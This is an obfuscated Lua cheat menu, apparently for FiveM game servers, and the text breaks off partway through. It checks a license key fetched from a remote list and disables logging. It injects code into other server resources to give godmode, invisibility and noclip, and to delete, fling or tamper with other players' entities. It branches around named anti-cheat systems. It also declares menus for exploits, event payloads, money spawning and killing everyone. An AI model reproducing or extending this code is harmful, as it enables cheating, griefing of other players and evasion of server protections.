local v0="https://raw.githack.com/WM5M/test/refs/heads/main/wmk.json";local v1=MachoWebRequest(v0);local v2=MachoAuthenticationKey();local v3=true;local function v4(v73) local v74=0 -0 ;local v75;local v76;local v77;local v78;local v79;local v80;while true do if (v74==(0 -0)) then if (type(v73)~="string") then return nil;end v75,v76,v77,v78,v79,v80=string.match(v73,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");v74=1 + 0 ;end if (v74==(2 -1)) then if  not v75 then return nil;end return (tonumber(os_time) or (0 -0)) + 0 ;end end end local function v5() local v81=0 + 0 ;local v82;while true do if (v81==(1 -0)) then return 806 -(118 + 688) ;end if (v81==(48 -(25 + 23))) then v82=GetCloudTimeAsInt();if (v82 and (v82>(0 + 0))) then return v82;end v81=1887 -(927 + 959) ;end end end local function v6(v83) local v84=0;local v85;local v86;local v87;local v88;local v89;local v90;local v91;local v92;while true do if (v84==0) then v85,v86,v87,v88,v89,v90=string.match(v83,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");if  not v85 then return nil;end v84=3 -2 ;end if (v84==1) then v91=((tonumber(v85) -(2702 -(16 + 716))) * (704 -339)) + math.floor((tonumber(v85) -1969)/4 ) + ((tonumber(v86) -1) * (127 -(11 + 86))) + tonumber(v87 or (2 -1) ) ;v92=(v91 * 86400) + (tonumber(v88 or (285 -(175 + 110)) ) * (9089 -5489)) + (tonumber(v89 or (0 -0) ) * (1856 -(503 + 1293))) + tonumber(v90 or (0 -0) ) ;v84=2 + 0 ;end if (v84==(1063 -(810 + 251))) then return v92;end end end local function v7() if  not v1 then return false,"No key list available";end local v93,v94=pcall(json.decode,v1);if ( not v93 or  not v94 or (type(v94)~="table")) then return false,"Key list invalid";end local v95=v5();for v264,v265 in ipairs(v94) do if ((type(v265)=="table") and (v265.key==v2)) then if (v265.expires and (type(v265.expires)=="string")) then local v360=0 + 0 ;local v361;while true do if (v360==1) then if (v361>v95) then return true,"Key valid (not expired)",v361;else return false,"Key expired",v361;end break;end if (v360==(0 + 0)) then v361=v6(v265.expires);if  not v361 then return false,"Bad expiry format";end v360=1 + 0 ;end end elseif v3 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end local v8,v9,v10=v7();if  not v8 then local v266=533 -(43 + 490) ;while true do if (v266==0) then MachoMenuNotification("WizeMenu","Invalid key: "   .. tostring(v2)   .. " ("   .. tostring(v9)   .. ")" ,10);return;end end end Citizen.CreateThread(function() if (v10 and (v10>0)) then local v280=733 -(711 + 22) ;local v281;local v282;while true do if (v280==(3 -2)) then if (v282>(859 -(240 + 619))) then local v384=math.floor(v282/86400 );local v385=math.floor((v282%(20850 + 65550))/(5726 -2126) );local v386=string.format("Key valid. Expires in %d days and %d hours.",v384,v385);MachoMenuNotification("WizeMenu",v386,1 + 4 );else MachoMenuNotification("WizeMenu","Key expired.",10);end break;end if (v280==(1744 -(1344 + 400))) then v281=v5();v282=v10-v281 ;v280=406 -(255 + 150) ;end end else MachoMenuNotification("WizeMenu","Key valid (no expiry field).",4 + 1 );end end);local v11=vec2(402 + 348 ,500);local v12=vec2(2136 -1636 ,1614 -1114 );local v13=1889 -(404 + 1335) ;local v14=416 -(183 + 223) ;local v15=15;local v16=v11.x-v13 ;local v17=v11.y-((2 -0) * v14) ;local v18=(v16-(v14 * (2 + 1)))/(1 + 1) ;local v19=(v17-(v14 * (340 -(10 + 327))))/(2 + 0) ;local v20=MachoMenuTabbedWindow("WizeVIP",v12.x,v12.y,v11.x,v11.y,v13);MachoMenuSetKeybind(v20,371 -(118 + 220) );MachoMenuSetAccent(v20,69 + 138 ,465 -(108 + 341) ,15 + 17 );MachoMenuText(v20,"YT @JayThaaGamer");local v21=MachoMenuAddTab(v20,"Self");local v22=MachoMenuAddTab(v20,"Server");local v23=MachoMenuAddTab(v20,"Teleport");local v24=MachoMenuAddTab(v20,"Weapon");local v25=MachoMenuAddTab(v20,"Vehicle");local v26=MachoMenuAddTab(v20,"Animations");local v27=MachoMenuAddTab(v20,"Triggers");local v28=MachoMenuAddTab(v20,"Settings");local v29=MachoMenuAddTab(v20,"VIP");local function v30(v96) local v97=0 -0 ;local v98;local v99;local v100;local v101;local v102;local v103;local v104;local v105;while true do if (v97==(1497 -(711 + 782))) then return v103,v104,v105;end if (v97==(1 -0)) then v100=v99 + v19 + v14 ;v101=v98 + v18 + v14 ;v97=471 -(270 + 199) ;end if (v97==(1 + 1)) then v102=(v19 * (1821 -(580 + 1239))) + v14 ;v103=MachoMenuGroup(v96,"Self",v98,v99,v98 + v18 ,v99 + v102 );v97=3;end if (v97==3) then v104=MachoMenuGroup(v96,"Model Changer",v101,v99,v101 + v18 ,v99 + v19 );v105=MachoMenuGroup(v96,"Functions",v101,v100,v101 + v18 ,v100 + v19 );v97=11 -7 ;end if (v97==0) then v98=v13 + v14 ;v99=v14 + v15 ;v97=1;end end end local function v31(v106) local v107=0;local v108;local v109;local v110;local v111;local v112;local v113;local v114;while true do if (v107==(3 + 0)) then v114=MachoMenuGroup(v106,"Everyone",v112,v14 + v15 ,v113,v17);return v111,v114;end if (1==v107) then v110=v109 + v108 ;v111=MachoMenuGroup(v106,"Player",v109,v14 + v15 ,v110,v17);v107=1 + 1 ;end if (2==v107) then v112=v110 + v14 ;v113=v112 + v108 ;v107=3;end if (v107==(0 + 0)) then v108=(v16-(v14 * (7 -4)))/(2 + 0) ;v109=v13 + v14 ;v107=1168 -(645 + 522) ;end end end local function v32(v115) local v116=0;local v117;local v118;local v119;local v120;local v121;local v122;local v123;while true do if (v116==(1793 -(1010 + 780))) then v123=MachoMenuGroup(v115,"Other",v121,v14 + v15 ,v122,v17);return v120,v123;end if (v116==(2 + 0)) then v121=v119 + v14 ;v122=v121 + v117 ;v116=3;end if (v116==(4 -3)) then v119=v118 + v117 ;v120=MachoMenuGroup(v115,"Teleport",v118,v14 + v15 ,v119,v17);v116=5 -3 ;end if (v116==0) then v117=(v16-(v14 * 3))/(1838 -(1045 + 791)) ;v118=v13 + v14 ;v116=2 -1 ;end end end local function v33(v124) local v125=0 -0 ;local v126;local v127;local v128;local v129;local v130;local v131;local v132;while true do if ((505 -(351 + 154))==v125) then v126=v13 + v14 ;v127=v14 + v15 ;v125=1;end if (v125==3) then v132=MachoMenuGroup(v124,"Other",v131,v14 + v15 ,v131 + v18 ,v17);return v129,v130,v132;end if (v125==2) then v130=MachoMenuGroup(v124,"Spawner",v126,v128,v126 + v18 ,v128 + v19 );v131=v126 + v18 + v14 ;v125=1577 -(1281 + 293) ;end if (v125==(267 -(28 + 238))) then v128=v127 + v19 + v14 ;v129=MachoMenuGroup(v124,"Mods",v126,v127,v126 + v18 ,v127 + v19 );v125=4 -2 ;end end end local function v34(v133) local v134=1559 -(1381 + 178) ;local v135;local v136;local v137;local v138;local v139;local v140;local v141;while true do if (v134==1) then v137=v136 + v19 + v14 ;v138=MachoMenuGroup(v133,"Mods",v135,v136,v135 + v18 ,v136 + v19 );v134=2 + 0 ;end if (v134==(2 + 0)) then v139=MachoMenuGroup(v133,"Plate & Spawning",v135,v137,v135 + v18 ,v137 + v19 );v140=v135 + v18 + v14 ;v134=2 + 1 ;end if (v134==3) then v141=MachoMenuGroup(v133,"Other",v140,v14 + v15 ,v140 + v18 ,v17);return v138,v139,v141;end if (v134==0) then v135=v13 + v14 ;v136=v14 + v15 ;v134=1;end end end local function v35(v142) local v143=0 -0 ;local v144;local v145;local v146;local v147;local v148;local v149;local v150;while true do if (v143==(0 + 0)) then v144=(v16-(v14 * 3))/(472 -(381 + 89)) ;v145=v13 + v14 ;v143=1 + 0 ;end if (v143==(1 + 0)) then v146=v145 + v144 ;v147=MachoMenuGroup(v142,"Animations",v145,v14 + v15 ,v146,v17);v143=2 -0 ;end if (v143==(1158 -(1074 + 82))) then v148=v146 + v14 ;v149=v148 + v144 ;v143=6 -3 ;end if (v143==3) then v150=MachoMenuGroup(v142,"Force Emotes",v148,v14 + v15 ,v149,v17);return v147,v150;end end end local function v36(v151) local v152=0;local v153;local v154;local v155;local v156;local v157;local v158;local v159;local v160;while true do if (v152==0) then v153=v13 + v14 ;v154=v14 + v15 ;v152=1;end if (v152==4) then return v156,v157,v159,v160;end if (v152==(1786 -(214 + 1570))) then v157=MachoMenuGroup(v151,"Money Spawner",v153,v154,v153 + v18 ,v154 + v19 );v158=v153 + v18 + v14 ;v152=1458 -(990 + 465) ;end if (v152==(1 + 0)) then v155=v154 + v19 + v14 ;v156=MachoMenuGroup(v151,"Item Spawner",v153,v155,v153 + v18 ,v154 + v19 );v152=1 + 1 ;end if (v152==(3 + 0)) then v159=MachoMenuGroup(v151,"Common Exploits",v158,v154,v158 + v18 ,v154 + v19 );v160=MachoMenuGroup(v151,"Event Payloads",v158,v155,v158 + v18 ,v155 + v19 );v152=4;end end end local function v37(v161) local v162=v13 + v14 ;local v163=v14 + v15 ;local v164=v163 + v19 + v14 ;local v165=MachoMenuGroup(v161,"Trigger Finder Spawner",v162,v163,v162 + v18 ,v163 + v19 );local v166=MachoMenuGroup(v161,"Common Exploits",v162,v164,v162 + v18 ,v164 + v19 );local v167=v162 + v18 + v14 ;local v168=MachoMenuGroup(v161,"Common Exploits V2",v167,v14 + v15 ,v167 + v18 ,v17);return v165,v166,v168;end local function v38(v169) local v170=v13 + v14 ;local v171=v14 + v15 ;local v172=v171 + v19 + v14 ;local v173=MachoMenuGroup(v169,"Stop",v170,v171,v170 + v18 ,v171 + v19 );local v174=MachoMenuGroup(v169,"Menu Design",v170,v172,v170 + v18 ,v172 + v19 );local v175=v170 + v18 + v14 ;local v176=MachoMenuGroup(v169,"Server Settings",v175,v14 + v15 ,v175 + v18 ,v17);return v173,v174,v176;end local v39={v30(v21)};local v40={v31(v22)};local v41={v32(v23)};local v42={v33(v24)};local v43={v34(v25)};local v44={v35(v26)};local v45={v36(v27)};local v46={v37(v29)};local v47={v38(v28)};local function v48(v177) return GetResourceState(v177)=="started" ;end local function v49() local v178=0 + 0 ;while true do if ((0 + 0)==v178) then Wait(1305 + 195 );Wait(337 -237 );v178=1995 -(109 + 1885) ;end if (v178==2) then Wait(1969 -(1269 + 200) );MachoMenuNotification("[NOTIFICATION] WizeMenu","Finished Enjoy.");break;end if (v178==(1 -0)) then MachoResourceStop(resourceName);MachoMenuNotification("[NOTIFICATION] WizeMenu","Almost done.");v178=2;end end end v49();local v50;if (GetResourceState("qbx_core")=="started") then v50="qbx_core";elseif (GetResourceState("es_extended")=="started") then v50="es_extended";elseif (GetResourceState("qb-core")=="started") then v50="qb-core";else v50="any";end Citizen.CreateThread(function() MachoMenuNotification("[NOTIFICATION] WizeMenu","Spawn Shit Now!");Wait(1315 -(98 + 717) );end);MachoLockLogger();MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
        local xJdRtVpNzQmKyLf = false -- Free Camera
    ]]);MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
        Unloaded = false
        local aXfPlMnQwErTyUi = false -- Godmode
        local sRtYuIoPaSdFgHj = false -- Invisibility
        local mKjHgFdSaPlMnBv = false -- No Ragdoll
        local uYtReWqAzXcVbNm = false -- Infinite Stamina
        local peqCrVzHDwfkraYZ = false -- Shrink Ped
        local NpYgTbUcXsRoVm = false -- No Clip
        local xCvBnMqWeRtYuIo = false -- Super Jump
        local nxtBFlQWMMeRLs = false -- Levitation
        local fgawjFmaDjdALaO = false -- Super Strength
        local qWeRtYuIoPlMnBv = false -- Super Punch
        local zXpQwErTyUiPlMn = false -- Throw From Vehicle
        local kJfGhTrEeWqAsDz = false -- Force Third Person
        local zXcVbNmQwErTyUi = false -- Force Driveby
        local yHnvrVNkoOvGMWiS = false -- Anti-Headshot
        local nHgFdSaZxCvBnMq = false -- Anti-Freeze
        local fAwjeldmwjrWkSf = false -- Anti-TP
        local aDjsfmansdjwAEl = false -- Anti-Blackscreen
        local qWpEzXvBtNyLmKj = false -- Crosshair

        local egfjWADmvsjAWf = false -- Spoofed Weapon Spawning
        local LkJgFdSaQwErTy = false -- Infinite Ammo
        local QzWxEdCvTrBnYu = false -- Explosive Ammo
        local RfGtHyUjMiKoLp = false -- One Shot Kill 

        local zXcVbNmQwErTyUi = false -- Vehicle Godmode
        local RNgZCddPoxwFhmBX = false -- Force Vehicle Engine
        local PlAsQwErTyUiOp = false -- Vehicle Auto Repair
        local LzKxWcVbNmQwErTy = false -- Freeze Vehicle
        local NuRqVxEyKiOlZm = false -- Vehicle Hop
        local GxRpVuNzYiTq = false -- Rainbow Vehicle
        local MqTwErYuIoLp = false -- Drift Mode
        local NvGhJkLpOiUy = false -- Easy Handling
        local VkLpOiUyTrEq = false -- Instant Breaks
        local BlNkJmLzXcVb = false -- Unlimited Fuel

        local aSwDeFgHiJkLoPx = false -- Normal Kill Everyone
        local qWeRtYuIoPlMnAb = false -- Permanent Kill Everyone
        local tUOgshhvIaku = false -- RPG Kill Everyone
        local zXcVbNmQwErTyUi = false -- 
    ]]);MachoMenuCheckbox(v39[827 -(802 + 24) ],"Godmode",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if aXfPlMnQwErTyUi == nil then aXfPlMnQwErTyUi = false end
            aXfPlMnQwErTyUi = true

            local function OxWJ1rY9vB()
                local fLdRtYpLoWqEzXv = CreateThread
                fLdRtYpLoWqEzXv(function()
                    while aXfPlMnQwErTyUi and not Unloaded do
                        local dOlNxGzPbTcQ = PlayerPedId()
                        local rKsEyHqBmUiW = PlayerId()

                        if GetResourceState("ReaperV4") == "started" then
                            local kcWsWhJpCwLI = SetPlayerInvincible
                            local ByTqMvSnAzXd = SetEntityInvincible
                            kcWsWhJpCwLI(rKsEyHqBmUiW, true)
                            ByTqMvSnAzXd(dOlNxGzPbTcQ, true)

                        elseif GetResourceState("WaveShield") == "started" then
                            local cvYkmZYIjvQQ = SetEntityCanBeDamaged
                            cvYkmZYIjvQQ(dOlNxGzPbTcQ, false)

                        else
                            local BiIqUJHexRrR = SetEntityCanBeDamaged
                            local UtgGRNyiPhOs = SetEntityProofs
                            local rVuKoDwLsXpC = SetEntityInvincible

                            BiIqUJHexRrR(dOlNxGzPbTcQ, false)
                            UtgGRNyiPhOs(dOlNxGzPbTcQ, true, true, true, false, true, false, false, false)
                            rVuKoDwLsXpC(dOlNxGzPbTcQ, true)
                        end

                        Wait(0)
                    end
                end)
            end

            OxWJ1rY9vB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            aXfPlMnQwErTyUi = false

            local dOlNxGzPbTcQ = PlayerPedId()
            local rKsEyHqBmUiW = PlayerId()

            if GetResourceState("ReaperV4") == "started" then
                local kcWsWhJpCwLI = SetPlayerInvincible
                local ByTqMvSnAzXd = SetEntityInvincible

                kcWsWhJpCwLI(rKsEyHqBmUiW, false)
                ByTqMvSnAzXd(dOlNxGzPbTcQ, false)

            elseif GetResourceState("WaveShield") == "started" then
                local AilJsyZTXnNc = SetEntityCanBeDamaged
                AilJsyZTXnNc(dOlNxGzPbTcQ, true)

            else
                local tBVAZMubUXmO = SetEntityCanBeDamaged
                local yuTiZtxOXVnE = SetEntityProofs
                local rVuKoDwLsXpC = SetEntityInvincible

                tBVAZMubUXmO(dOlNxGzPbTcQ, true)
                yuTiZtxOXVnE(dOlNxGzPbTcQ, false, false, false, false, false, false, false, false)
                rVuKoDwLsXpC(dOlNxGzPbTcQ, false)
            end
        ]]);end);MachoMenuCheckbox(v39[1 -0 ],"Invisibility",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
            sRtYuIoPaSdFgHj = true

            local function d2NcWoyTfb()
                if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
                sRtYuIoPaSdFgHj = true

                local zXwCeVrBtNuMyLk = CreateThread
                zXwCeVrBtNuMyLk(function()
                    while sRtYuIoPaSdFgHj and not Unloaded do
                        local uYiTpLaNmZxCwEq = SetEntityVisible
                        local hGfDrEsWxQaZcVb = PlayerPedId()
                        uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, false, false)
                        Wait(0)
                    end

                    local uYiTpLaNmZxCwEq = SetEntityVisible
                    local hGfDrEsWxQaZcVb = PlayerPedId()
                    uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
                end)
            end

            d2NcWoyTfb()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            sRtYuIoPaSdFgHj = false

            local function tBKM4syGJL()
                local uYiTpLaNmZxCwEq = SetEntityVisible
                local hGfDrEsWxQaZcVb = PlayerPedId()
                uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
            end

            tBKM4syGJL()
        ]]);end);MachoMenuCheckbox(v39[1 -0 ],"No Ragdoll",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if mKjHgFdSaPlMnBv == nil then mKjHgFdSaPlMnBv = false end
            mKjHgFdSaPlMnBv = true

            local function jP7xUrK9Ao()
                local zVpLyNrTmQxWsEd = CreateThread
                zVpLyNrTmQxWsEd(function()
                    while mKjHgFdSaPlMnBv and not Unloaded do
                        local oPaSdFgHiJkLzXc = SetPedCanRagdoll
                        oPaSdFgHiJkLzXc(PlayerPedId(), false)
                        Wait(0)
                    end
                end)
            end

            jP7xUrK9Ao()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            mKjHgFdSaPlMnBv = false
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"Infinite Stamina",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if uYtReWqAzXcVbNm == nil then uYtReWqAzXcVbNm = false end
            uYtReWqAzXcVbNm = true

            local function YLvd3pM0tB()
                local tJrGyHnMuQwSaZx = CreateThread
                tJrGyHnMuQwSaZx(function()
                    while uYtReWqAzXcVbNm and not Unloaded do
                        local aSdFgHjKlQwErTy = RestorePlayerStamina
                        local rTyUiEaOpAsDfGhJk = PlayerId()
                        aSdFgHjKlQwErTy(rTyUiEaOpAsDfGhJk, 1.0)
                        Wait(0)
                    end
                end)
            end

            YLvd3pM0tB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            uYtReWqAzXcVbNm = false
        ]]);end);MachoMenuCheckbox(v39[1],"Tiny Ped",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if peqCrVzHDwfkraYZ == nil then peqCrVzHDwfkraYZ = false end
            peqCrVzHDwfkraYZ = true

            local function YfeemkaufrQjXTFY()
                local OLZACovzmAvgWPmC = CreateThread
                OLZACovzmAvgWPmC(function()
                    while peqCrVzHDwfkraYZ and not Unloaded do
                        local aukLdkvEinBsMWuA = SetPedConfigFlag
                        aukLdkvEinBsMWuA(PlayerPedId(), 223, true)
                        Wait(0)
                    end
                end)
            end

            YfeemkaufrQjXTFY()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            peqCrVzHDwfkraYZ = false
            local aukLdkvEinBsMWuA = SetPedConfigFlag
            aukLdkvEinBsMWuA(PlayerPedId(), 223, false)
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"No Clip",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if NpYgTbUcXsRoVm == nil then NpYgTbUcXsRoVm = false end
            NpYgTbUcXsRoVm = true

            local function KUQpH7owdz()
                local RvBcNxMzKgUiLo = PlayerPedId
                local EkLpOiUhYtGrFe = GetVehiclePedIsIn
                local CtVbXnMzQaWsEd = GetEntityCoords
                local DrTgYhUjIkOlPm = GetEntityHeading
                local QiWzExRdCtVbNm = GetGameplayCamRelativeHeading
                local AoSdFgHjKlZxCv = GetGameplayCamRelativePitch
                local JkLzXcVbNmAsDf = IsDisabledControlJustPressed
                local TyUiOpAsDfGhJk = IsDisabledControlPressed
                local WqErTyUiOpAsDf = SetEntityCoordsNoOffset
                local PlMnBvCxZaSdFg = SetEntityHeading
                local HnJmKlPoIuYtRe = CreateThread

                local YtReWqAzXsEdCv = false

                HnJmKlPoIuYtRe(function()
                    while NpYgTbUcXsRoVm and not Unloaded do
                        Wait(0)

                        if JkLzXcVbNmAsDf(0, 303) then
                            YtReWqAzXsEdCv = not YtReWqAzXsEdCv
                        end

                        if YtReWqAzXsEdCv then
                            local speed = 2.0

                            local p = RvBcNxMzKgUiLo()
                            local v = EkLpOiUhYtGrFe(p, false)
                            local inVeh = v ~= 0 and v ~= nil
                            local ent = inVeh and v or p

                            local pos = CtVbXnMzQaWsEd(ent, true)
                            local head = QiWzExRdCtVbNm() + DrTgYhUjIkOlPm(ent)
                            local pitch = AoSdFgHjKlZxCv()

                            local dx = -math.sin(math.rad(head))
                            local dy = math.cos(math.rad(head))
                            local dz = math.sin(math.rad(pitch))
                            local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                            if len ~= 0 then
                                dx, dy, dz = dx / len, dy / len, dz / len
                            end

                            if TyUiOpAsDfGhJk(0, 21) then speed = speed + 2.5 end
                            if TyUiOpAsDfGhJk(0, 19) then speed = 0.25 end

                            if TyUiOpAsDfGhJk(0, 32) then
                                pos = pos + vector3(dx, dy, dz) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 34) then
                                pos = pos + vector3(-dy, dx, 0.0) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 269) then
                                pos = pos - vector3(dx, dy, dz) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 9) then
                                pos = pos + vector3(dy, -dx, 0.0) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 22) then
                                pos = pos + vector3(0.0, 0.0, speed)
                            end
                            if TyUiOpAsDfGhJk(0, 36) then
                                pos = pos - vector3(0.0, 0.0, speed)
                            end

                            WqErTyUiOpAsDf(ent, pos.x, pos.y, pos.z, true, true, true)
                            PlMnBvCxZaSdFg(ent, head)
                        end
                    end
                    YtReWqAzXsEdCv = false
                end)
            end

            KUQpH7owdz()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            NpYgTbUcXsRoVm = false
        ]]);end);MachoMenuCheckbox(v39[1],"Free Camera",function() MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
            
            g_FreecamFeatureEnabled = true
            
            local function initializeFreecam()
                -- Script State
                local isFreecamActive = false
                local freecamHandle = nil
                local targetCoords, targetEntity = nil, nil
                local currentFeatureIndex = 1

                -- NEW FEATURE: Ped Spawning State
                local pedsToSpawn = { "s_m_m_movalien_01", "u_m_y_zombie_01", "s_m_y_blackops_01", "csb_abigail", "a_c_coyote" }
                local currentPedIndex = 1

                local stopFreecam, startFreecam

                -- Feature Definitions (Now with Ped Spawner)
                local Features = { 
                    "Look-Around", 
                    "Spawn Ped",         -- ADDED
                    "Teleport", 
                    "Delete Entity", 
                    "Fling Entity", 
                    "Flip Vehicle", 
                    "Launch Vehicle",
                    "Teleport Vehicle",
                    "Mess With Vehicle"
                }

                -- Helper Function for Drawing Text
                local function drawText(content, x, y, options)
                    SetTextFont(options.font or 4)
                    SetTextScale(0.0, options.scale or 0.3)
                    SetTextColour(options.color[1], options.color[2], options.color[3], options.color[4])
                    SetTextOutline()
                    if options.shadow then SetTextDropShadow(2, 0, 0, 0, 255) end
                    SetTextCentre(true)
                    BeginTextCommandDisplayText("STRING")
                    AddTextComponentSubstringPlayerName(content)
                    EndTextCommandDisplayText(x, y)
                end

                -- Main Draw Thread (UI Only)
                local function drawThread()
                    while isFreecamActive do
                        Wait(0)
                        -- Draw Crosshair
                        drawText("•", 0.5, 0.485, {font = 4, scale = 0.5, color = {255,255,255,200}})
                        
                        -- ##### UI FIX: SCROLLING MENU LOGIC #####
                        local ui = { x = 0.5, y = 0.75, lineHeight = 0.03, maxVisible = 7, colors = { text = {245, 245, 245, 120}, selected = {52, 152, 219, 255} } }
                        local numFeatures = #Features
                        local startIdx, endIdx = 1, numFeatures

                        if numFeatures > ui.maxVisible then
                            startIdx = math.max(1, currentFeatureIndex - math.floor(ui.maxVisible / 2))
                            endIdx = math.min(numFeatures, startIdx + ui.maxVisible - 1)
                            if endIdx == numFeatures then
                                startIdx = numFeatures - ui.maxVisible + 1
                            end
                        end

                        -- Draw a counter above the list
                        drawText(("%d/%d"):format(currentFeatureIndex, numFeatures), ui.x, ui.y - 0.035, {scale = 0.25, color = {255,255,255,120}})

                        local displayCount = 0
                        for i = startIdx, endIdx do
                            local featureName = Features[i]
                            local isSelected = (i == currentFeatureIndex)
                            local lineY = ui.y + (displayCount * ui.lineHeight)
                            if isSelected then
                                drawText(("[ %s ]"):format(featureName), ui.x, lineY, {scale = 0.32, color = ui.colors.selected, shadow = true})
                            else
                                drawText(featureName, ui.x, lineY, {scale = 0.28, color = ui.colors.text})
                            end
                            displayCount = displayCount + 1
                        end
                    end
                end

                -- Main Input and Logic Thread
                local function logicThread()
                    while isFreecamActive do
                        Wait(0)
                        if IsDisabledControlJustPressed(0, 241) then currentFeatureIndex = (currentFeatureIndex - 2 + #Features) % #Features + 1 elseif IsDisabledControlJustPressed(0, 242) then currentFeatureIndex = (currentFeatureIndex % #Features) + 1 end
                        
                        if IsDisabledControlJustPressed(0, 24) then -- Action Key Pressed
                            local currentFeature = Features[currentFeatureIndex]
                            if currentFeature == "Teleport" and targetCoords then
                                local ped = PlayerPedId()
                                local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false)
                                SetEntityCoords(ped, targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z, false, false, false, true)
                            -- ##### NEW FEATURE: SAFE PED SPAWNER LOGIC #####
                            elseif currentFeature == "Spawn Ped" and targetCoords then
                                local model = pedsToSpawn[currentPedIndex]
                                CreateThread(function()
                                    local modelHash = GetHashKey(model)
                                    RequestModel(modelHash)
                                    local timeout = 2000 -- 2 second timeout for model loading
                                    while not HasModelLoaded(modelHash) and timeout > 0 do
                                        Wait(100)
                                        timeout = timeout - 100
                                    end
                                    if HasModelLoaded(modelHash) then
                                        local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z, false)
                                        local spawnPos = vector3(targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z)
                                        local newPed = CreatePed(4, modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, true)
                                        SetModelAsNoLongerNeeded(modelHash)
                                        TaskStandStill(newPed, -1) -- Make them stand still
                                        currentPedIndex = (currentPedIndex % #pedsToSpawn) + 1 -- Cycle to the next ped for next time
                                    end
                                end)
                            elseif currentFeature == "Delete Entity" and targetEntity and DoesEntityExist(targetEntity) then
                                SetEntityAsMissionEntity(targetEntity, true, true)
                                DeleteEntity(targetEntity)
                            elseif currentFeature == "Fling Entity" and targetEntity and (IsEntityAPed(targetEntity) or IsEntityAVehicle(targetEntity)) then
                                ApplyForceToEntity(targetEntity, 1, math.random(-50.0, 50.0), math.random(-50.0, 50.0), 50.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                            elseif currentFeature == "Flip Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                SetVehicleOnGroundProperly(targetEntity)
                            elseif currentFeature == "Launch Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                ApplyForceToEntity(targetEntity, 1, 0.0, 0.0, 100.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                            elseif currentFeature == "Teleport Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                local currentCoords = GetEntityCoords(targetEntity)
                                local newCoords = currentCoords + GetEntityForwardVector(targetEntity) * 5.0 + vector3(0.0, 0.0, 50.0)
                                SetEntityCoords(targetEntity, newCoords.x, newCoords.y, newCoords.z, false, false, false, true)
                            elseif currentFeature == "Mess With Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                local actions = {
                                    function(veh) SetVehicleTyreBurst(veh, math.random(0, 5), false, 1000.0) end,
                                    function(veh) SetVehicleDoorOpen(veh, math.random(0, 5), false, false) end,
                                    function(veh) SetVehicleEngineOn(veh, not IsVehicleEngineOn(veh), false, true) end,
                                    function(veh) SetVehicleLights(veh, math.random(0, 2)) end,
                                    function(veh) StartVehicleHorn(veh, 1000, "HELDDOWN", false) end
                                }
                                local randomAction = actions[math.random(#actions)]
                                randomAction(targetEntity)
                            end
                        end
                    end
                end

                -- Main Camera Movement Thread (Unchanged)
                local function cameraThread()
                    local baseSpeed, boostSpeed, slowSpeed = 1.0, 9.0, 0.1; local mouseSensitivity = 7.5; local function clamp(val, min, max) return math.max(min, math.min(max, val)) end; local function rotToDir(rot) local rX, rZ = math.rad(rot.x), math.rad(rot.z); return vector3(-math.sin(rZ)*math.cos(rX), math.cos(rZ)*math.cos(rX), math.sin(rX)) end;
                    while isFreecamActive do
                        Wait(0)
                        local camPos, camRotRaw = GetCamCoord(freecamHandle), GetCamRot(freecamHandle, 2); local camRot = { x = camRotRaw.x, y = camRotRaw.y, z = camRotRaw.z }; local direction = rotToDir(camRot); local right = vector3(direction.y, -direction.x, 0)
